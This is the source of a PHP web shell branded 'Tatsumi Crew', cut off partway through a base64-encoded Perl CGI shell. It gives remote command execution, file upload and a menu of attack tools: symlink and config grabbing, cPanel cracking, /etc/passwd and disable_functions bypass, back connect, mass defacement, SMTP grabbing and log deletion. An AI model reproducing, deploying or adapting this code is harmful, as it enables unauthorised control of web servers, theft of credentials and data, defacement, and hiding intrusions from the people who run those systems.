<?php
session_start();
error_reporting(0);
set_time_limit(0);
?>
    <!DOCTYPE html>
    <html>
    <head>
    <link href="" rel="stylesheet" type="text/css">
    <title>Tatsumi Crew</title>
    <link href='https://fonts.googleapis.com/css?family=VT323' rel='stylesheet'>
    <style type="text/css">
    body{background: #263238;color:#eceff1;font-family:'Courier';margin:1;font-size: 13px;
    }
    h1{font-family:'VT323';font-weight:normal;font-size:60px;margin:0;
    }
    h1:hover{color:#ffee58;}select{background:#222222;color:#eceff1;
    }
    a{color:lime;text-decoration:none;font-family:'Courier'
    }
    textarea{width:900px;height:250px;background:transparent;border:1px dashed #ef6c00;color:#ef6c00;padding:2px;
    }
    tr.first{border-bottom:1px dashed #ef6c00;}tr:hover{background: #222222;
    }
    th
    {
    background: #222222;padding:10px;}

    }
    li {
      display: inline;
      margin: 1px;
      padding: 1px;
    }

    select {
      width: 152px;
      background: #000000; 
      color: green; 
      border: 1px solid lime; 
      margin: 5px auto;
      padding-left: 5px;
      font-family: 'Space Mono';
      font-size: 12px;
    }

    #menu a {
            padding: 2px 12px;  
            margin:0; 
            background: #333333; 
            text-decoration:none; 
            letter-spacing:1px; 
            padding: 2px 10px;
            margin: 0;
            background: #222222;
            text-decoration: none;
            letter-spacing: 1px;
            border-radius: 2px;
            border: 1px solid grey;
           }
           #menu a:hover {
          background: #222222; 
          border-bottom:0px solid #333333; 
          border-top:0px solid #333333; 
          border-right:0px solid #333333; 
          border-left:0px solid #333333;
           }
      input[type=text], input[type=password],input[type=submit] {
      background: #222222; 
      color: lime; 
      border: 1px solid grey; 
      margin: 5px auto;
      padding-left: 5px;
      font-family: 'Courier';
      font-size: 13px;
    }
    input[type=submit] {
      background: #222222; 
      color: lime; 
      border: 1px solid grey; 
      margin: 5px auto;
      padding-left: 5px;
      font-family: 'Courier';
      font-size: 13px;
      cursor:pointer;
    }


    </style>
       </head>
        <body>

    <?php
    echo "<center>";
    echo "<img src='https://4.bp.blogspot.com/-nqELTespHdU/WontZiUNB3I/AAAAAAAAAx4/nX-bGZJ6Fx81SUTwYE1Yxp-xFR_T1qVuACLcBGAs/s320/lambang4.png width='200px' height='150px' style='float: center;'>";
    echo "<br>";
    echo "<font color=white class='Courier'>[</font>";
    echo "<font color=lime class='Courier'>Karena Orang Bodoh Seperti Kami Akan Sukses Dengan Sendirinya</font>";
    echo "<font color=white class='Courier'>]</font>";
    echo "<br>";
    echo "<br>";
    function w($dir, $perm)
    {
        if (!is_writable($dir)) {
            return "<font color=red>" . $perm . "</font>";
        } else {
            return "<font color=lime>" . $perm . "</font>";
        }
    }
    function r($dir, $perm)
    {
        if (!is_readable($dir)) {
            return "<font color=red>" . $perm . "</font>";
        } else {
            return "<font color=lime>" . $perm . "</font>";
        }
        
    }
    function exe($cmd)
    {
        if (function_exists('system')) {
            @ob_start();
            @system($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif (function_exists('exec')) {
            @exec($cmd, $results);
            $buff = "";
            foreach ($results as $result) {
                $buff .= $result;
            }
            return $buff;
        } elseif (function_exists('passthru')) {
            @ob_start();
            @passthru($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif (function_exists('shell_exec')) {
            $buff = @shell_exec($cmd);
            return $buff;
        }
    }
    function hdd($s)
    {
        if ($s >= 1073741824)
            return sprintf('%1.2f', $s / 1073741824) . ' GB';
        elseif ($s >= 1048576)
            return sprintf('%1.2f', $s / 1048576) . ' MB';
        elseif ($s >= 1024)
            return sprintf('%1.2f', $s / 1024) . ' KB';
        else
            return $s . ' B';
    }
    function ambilKata($param, $kata1, $kata2)
    {
        if (strpos($param, $kata1) === FALSE)
            return FALSE;
        if (strpos($param, $kata2) === FALSE)
            return FALSE;
        $start  = strpos($param, $kata1) + strlen($kata1);
        $end    = strpos($param, $kata2, $start);
        $return = substr($param, $start, $end - $start);
        return $return;
    }
    function getsource($url)
    {
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        $content = curl_exec($curl);
        curl_close($curl);
        return $content;
    }
    function bing($dork)
    {
        $npage    = 1;
        $npages   = 30000;
        $allLinks = array();
        $lll      = array();
        while ($npage <= $npages) {
            $x = getsource("http://www.bing.com/search?q=" . $dork . "&first=" . $npage);
            if ($x) {
                preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
                foreach ($findlink[1] as $fl)
                    array_push($allLinks, $fl);
                $npage = $npage + 10;
                if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0)
                    break;
            } else
                break;
        }
        $URLs = array();
        foreach ($allLinks as $url) {
            $exp    = explode("/", $url);
            $URLs[] = $exp[2];
        }
        $array = array_filter($URLs);
        $array = array_unique($array);
        $sss   = count(array_unique($array));
        foreach ($array as $domain) {
            echo $domain . "\n";
        }
    }
    function reverse($url)
    {
        $ch = curl_init("http://domains.yougetsignal.com/domains.php");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "remoteAddress=$url&ket=");
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_POST, 1);
        $resp  = curl_exec($ch);
        $resp  = str_replace("[", "", str_replace("]", "", str_replace("\"\"", "", str_replace(", ,", ",", str_replace("{", "", str_replace("{", "", str_replace("}", "", str_replace(", ", ",", str_replace(", ", ",", str_replace("'", "", str_replace("'", "", str_replace(":", ",", str_replace('"', '', $resp)))))))))))));
        $array = explode(",,", $resp);
        unset($array[0]);
        foreach ($array as $lnk) {
            $lnk = "http://$lnk";
            $lnk = str_replace(",", "", $lnk);
            echo $lnk . "\n";
            ob_flush();
            flush();
        }
        curl_close($ch);
    }
    if (get_magic_quotes_gpc()) {
        function idx_ss($array)
        {
            return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
        }
        $_POST   = idx_ss($_POST);
        $_COOKIE = idx_ss($_COOKIE);
    }

    if (isset($_GET['dir'])) {
        $dir = $_GET['dir'];
        chdir($dir);
    } else {
        $dir = getcwd();
    }
    $kernel    = php_uname();
    $ip        = gethostbyname($_SERVER['HTTP_HOST']);
    $dir       = str_replace("\\", "/", $dir);
    $scdir     = explode("/", $dir);
    $freespace = hdd(disk_free_space("/"));
    $total     = hdd(disk_total_space("/"));
    $used      = $total - $freespace;
    $sm        = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
    $ds        = @ini_get("disable_functions");
    $mysql     = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
    $curl      = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
    $wget      = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
    $perl      = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
    $python    = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
    $show_ds   = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
    if (!function_exists('posix_getegid')) {
        $user  = @get_current_user();
        $uid   = @getmyuid();
        $gid   = @getmygid();
        $group = "?";
    } else {
        $uid   = @posix_getpwuid(posix_geteuid());
        $gid   = @posix_getgrgid(posix_getegid());
        $user  = $uid['name'];
        $uid   = $uid['uid'];
        $group = $gid['name'];
        $gid   = $gid['gid'];
    }

    echo "<center>";
    echo "System: <font color=lime>" . $kernel . "</font><br>";
    echo "User: <font color=lime>" . $user . "</font> (" . $uid . ") Group: <font color=lime>" . $group . "</font> (" . $gid . ")<br>";
    echo "Server IP: <font color=lime>" . $ip . "</font> | Your IP: <font color=lime>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
    echo "HDD: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
    echo "Safe Mode: $sm<br>";
    echo "Disable Functions: $show_ds<br>";
    echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
    echo "<br>";
    echo "<a href='?' style='border:1px solid grey;width:80px;padding:0px 8px 0px 8px;'>H O M E</a>&nbsp;<a href='?shell&do=kill' style='border:1px solid grey;width:80px;padding:0px 8px 0px 8px;'>K I L L </a>&nbsp;<a href='?byee&do=logout' style='color:maroon;border:1px solid grey;width:80px;padding:0px 8px 0px 8px;'>L O G O U T</a>";
    echo "</td></table>";
    echo "</center>";
    echo "<br>";
    echo "<center>";
    echo "<ul>";
    echo "
    <div id='menu'>
    <center>
    <a href='?dir=$dir&do=upload'>Upload</a>
    <a href='?dir=$dir&do=cmd'>Command</a>
    <a href='?dir=$dir&do=adminer'>Adminer</a>
    <a href='?dir=$dir&do=jumping'>Jumping</a>
    <a href='?dir=$dir&do=symlink'>Symlink</a>
    <a href='?dir=$dir&do=404'>Symlink404</a>
    <a href='?dir=$dir&do=python'>Symlink Python</a>
    <a href='?dir=$dir&do=symconfig'>SymConfig</a>
    <a href='?dir=$dir&do=config'>Config</a>
    <a href='?dir=$dir&do=configv2'>Config V.2</a>
    <a href='?dir=$dir&do=whm'>Whm Grab</a>
    <br>
    <br>
    <a href='?dir=$dir&do=hash'>Hash Password</a>
    <a href='?dir=$dir&do=hashid'>hash identification</a>
    <a href='?dir=$dir&do=cpanel'>CPanel Crack</a>
    <a href='?dir=$dir&do=vhost'>Bypass vHost</a>
    <a href='?dir=$dir&do=passwbypass'>Bypass Etc/Passw</a>
    <a href='?dir=$dir&do=bypass'>Disable Functions</a>
    <a href='?dir=$dir&do=csrfup'>CsrfXploit</a>
    <br>
    <br>
    <a href='?dir=$dir&do=whm'>Whm Grab</a>
    <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a>
    <a href='?dir=$dir&do=auto_wp'>Auto Edit Title</a>
    <a href='?dir=$dir&do=mass_deface'>Mass Tools</a>
    <a href='?dir=$dir&do=mailer'>Mailer</a>
    <a href='?dir=$dir&do=Domains'>Domain Views</a>
    <a href='?dir=$dir&do=string'>StringTools</a>
    <a href='?dir=$dir&do=smtp'>SMTP Grabber</a>
    <br>
    <br>
    <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a>
    <a href='?dir=$dir&do=cgi'>CGI Perl</a>
    <a href='?dir=$dir&do=cgi2'>CGI Perl V.2</a>
    <a href='?dir=$dir&do=cgipy'>Cgi Python</a>
    <a href='?dir=$dir&do=backconnect'>Back Connect</a>
    <a href='?dir=$dir&do=port'>Port Scan</a>
    <a href='?dir=$dir&do=infosec'>Server Info</a>
    <a href='?dir=$dir&do=dbdump'>DB Dump</a>
    <br><br><br>
    <a href='?dir=$dir&do=zoneh'>Zone-H</a>
    <a href='?dir=$dir&do=logs'>Delete Logs</a>
     <a href='?dir=$dir&do=about'>About Me</a>
    </div></div></center>";
    echo "<center>";
    if (isset($_GET['path'])) {
        $path = $_GET['path'];
        chdir($_GET['path']);
    } else {
        $path = getcwd();
    }
    echo "Current DIR: ";
    foreach ($scdir as $c_dir => $cdir) {
        echo "<a href='?dir=";
        for ($i = 0; $i <= $c_dir; $i++) {
            echo $scdir[$i];
            if ($i != $c_dir) {
                echo "/";
            }
        }
        echo "'>$cdir</a>/";
    }
    echo "[ " . w($dir, perms($dir)) . " ]";
    echo "<hr color='#333333'>";
    echo "</center>";
    echo "<center>";
    if (isset($_GET['filesrc'])) {
        echo '<table width="100%" color="" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';
        echo "" . basename($_GET['filesrc']);
        "";
        echo '</tr></td></table><br />';
        echo ("<center><textarea readonly=''>" . htmlspecialchars(file_get_contents($_GET['filesrc'])) . "</textarea></center>");
    } elseif ($_GET['do'] == 'upload') {
        echo "<center>";
        if ($_POST['upload']) {
            if ($_POST['tipe_upload'] == 'biasa') {
                if (@copy($_FILES['ix_file']['tmp_name'], "$dir/" . $_FILES['ix_file']['name'] . "")) {
                    $act = "<font color=lime>Uploaded!</font> at <i><b>$dir/" . $_FILES['ix_file']['name'] . "</b></i>";
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            } else {
                $root = $_SERVER['DOCUMENT_ROOT'] . "/" . $_FILES['ix_file']['name'];
                $web  = $_SERVER['HTTP_HOST'] . "/" . $_FILES['ix_file']['name'];
                if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
                    if (@copy($_FILES['ix_file']['tmp_name'], $root)) {
                        $act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                    } else {
                        $act = "<font color=red>failed to upload file</font>";
                    }
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            }
        }
        echo "Upload File:
      <form method='post' enctype='multipart/form-data'>
      <input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ " . w($dir, "Writeable") . " ] 
      <input type='radio' name='tipe_upload' value='home_root'>home_root [ " . w($_SERVER['DOCUMENT_ROOT'], "Writeable") . " ]<br>
      <input type='file' name='ix_file'>
      <input type='submit' value='upload' name='upload'>
      </form>";
        echo $act;
        echo "</center>";
    } elseif ($_GET['do'] == 'cmd') {
        echo "<form method='post'>
      <font style='Courier: underline;'>" . $user . "@" . gethostbyname($_SERVER['HTTP_HOST']) . ": ~ $ </font>
      <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
      </form>";
        if ($_POST['do_cmd']) {
            echo "<pre>" . exe($_POST['cmd']) . "</pre>";
        }
    } elseif ($_GET['do'] == 'adminer') {
        $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
        function adminer($url, $isi)
        {
            $fp = fopen($isi, "w");
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_FILE, $fp);
            return curl_exec($ch);
            curl_close($ch);
            fclose($fp);
            ob_flush();
            flush();
        }
        if (file_exists('adminer.php')) {
            echo "<center><font color=green><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
        } else {
            if (adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php", "adminer.php")) {
                echo "<center><font color=green><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
            } else {
                echo "<center><font color=maroon>gagal buat file adminer</font></center>";
            }

        }
        } elseif($_GET['do'] == 'cgi') {
      $cgi_dir = mkdir('santuy_cgi', 0755);
            chdir('santuy_cgi');
      $file_cgi = "cgi.santuy";
            $memeg = ".htaccess";
      $isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .santuy \n AddHandler cgi-script .santuy \n AddHandler cgi-script .santuy";
      $htcgi = fopen(".htaccess", "w");
      $cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS4zIjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7DQoNCiRQYXNzd29yZCA9ICJvd2xzcXVhZCI7CQkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzIHRvIGxvZ2luLg0Kc3ViIElzX1dpbigpew0KCSRvcyA9ICZ0cmltKCRFTlZ7IlNFUlZFUl9TT0ZUV0FSRSJ9KTsNCglpZigkb3MgPX4gbS93aW4vaSl7DQoJCXJldHVybiAxOw0KCX0NCgllbHNlew0KCQlyZXR1cm4gMDsNCgl9DQp9DQokV2luTlQgPSAmSXNfV2luKCk7CQkJCSMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYNCgkJCQkJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQNCgkJCQkJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBvbiBVbml4LCB5b3UNCgkJCQkJCQkJIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLg0KDQokTlRDbWRTZXAgPSAiJiI7CQkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gV2luZG93cyBOVC4NCg0KJFVuaXhDbWRTZXAgPSAiOyI7CQkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gVW5peC4NCg0KJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDAwMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQNCgkJCQkJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMNCgkJCQkJCQkJIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KCQkJCQkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuDQoJCQkJCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMNCgkJCQkJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZlcnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQ0KCQkJCQkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KCQkJCQkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQNCgkJCQkJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNlZnVsIGZvciBjb21tYW5kcyBsaWtlDQoJCQkJCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQoJCQkJCQkJCSMgaXMgYmVpbmcgZ2VuZXJhdGVkLg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUgVU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KJGNvbHM9IDE1MDsNCiRyb3dzPSAyNjsNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmVhZHMgdGhlIGlucHV0IHNlbnQgYnkgdGhlIGJyb3dzZXIgYW5kIHBhcnNlcyB0aGUgaW5wdXQgdmFyaWFibGVzLiBJdA0KIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLg0KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9Lg0KIyBPdGhlciB2YXJpYWJsZXMgY2FuIGJlIGFjY2Vzc2VkIHVzaW5nICRpbnsndmFyJ30sIHdoZXJlIHZhciBpcyB0aGUgbmFtZSBvZg0KIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQ0KIyBzY3JpcHRzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJlYWRQYXJzZSANCnsNCglsb2NhbCAoKmluKSA9IEBfIGlmIEBfOw0KCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoJDQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoNCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0KCXsNCgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQoJfQ0KCWVsc2lmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIlBPU1QiKQ0KCXsNCgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOw0KCQlyZWFkKFNURElOLCAkaW4sICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KCX0NCg0KCSMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCgl7DQoJCSRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcgDQoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IA0KCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOw0KCQkkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87DQoJCSRIZWFkZXIgPSAkYDsNCgkJJEJvZHkgPSAkJzsNCiAJCSRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgDQoJCSRpbnsnZid9ID0gJDE7IA0KCQkkaW57J2YnfSA9fiBzL1wiLy9nOw0KCQkkaW57J2YnfSA9fiBzL1xzLy9nOw0KDQoJCSMgcGFyc2UgdHJhaWxlcg0KCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQ0KCQl7IA0KCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQoJCQkka2V5ID0gJDE7DQoJCQkkdmFsID0gJCc7DQoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSA9ICR2YWw7IA0KCQl9DQoJfQ0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KCXsNCgkJQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KCQlmb3JlYWNoICRpICgwIC4uICQjaW4pDQoJCXsNCgkJCSRpblskaV0gPX4gcy9cKy8gL2c7DQoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCgkJCSRpbnska2V5fSAuPSAkdmFsOw0KCQl9DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcg0KIyBBcmd1bWVudCAxOiBGb3JtIGl0ZW0gbmFtZSB0byB3aGljaCBmb2N1cyBzaG91bGQgYmUgc2V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCglteSAkZGlyID0kQ3VycmVudERpcjsNCgkkZGlyPX4gcy9cXC9cXFxcL2c7DQoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQoJcHJpbnQgPDxFTkQ7DQo8aHRtbD4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiPg0KPHRpdGxlPmIzNzRrIENHSS1UZWxuZXQ8L3RpdGxlPg0KDQokSHRtbE1ldGFIZWFkZXINCg0KPC9oZWFkPg0KPHN0eWxlPg0KYm9keXsNCmZvbnQ6IDEwcHQgVmVyZGFuYTsNCn0NCnRyIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KY29sb3I6ICNmZjk5MDA7DQp9DQp0ZCB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCmNvbG9yOiAjMkJBOEVDOw0KZm9udDogMTBwdCBWZXJkYW5hOw0KfQ0KDQp0YWJsZSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxMTE7DQp9DQoNCg0KaW5wdXQgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmZvbnQ6IDEwcHQgVmVyZGFuYTsNCmNvbG9yOiAjZmY5OTAwOw0KfQ0KDQppbnB1dC5zdWJtaXQgew0KdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KY29sb3I6ICNGRkZGRkY7DQpib3JkZXItY29sb3I6ICMwMDk5MDA7DQp9DQoNCmNvZGUgew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOw0KY29sb3I6IHdoaWxlOw0KfQ0KDQpydW4gew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpmb250OiAxMHB0IFZlcmRhbmEgYm9sZDsNCmNvbG9yOiAjRkYwMEFBOw0KfQ0KDQp0ZXh0YXJlYSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHN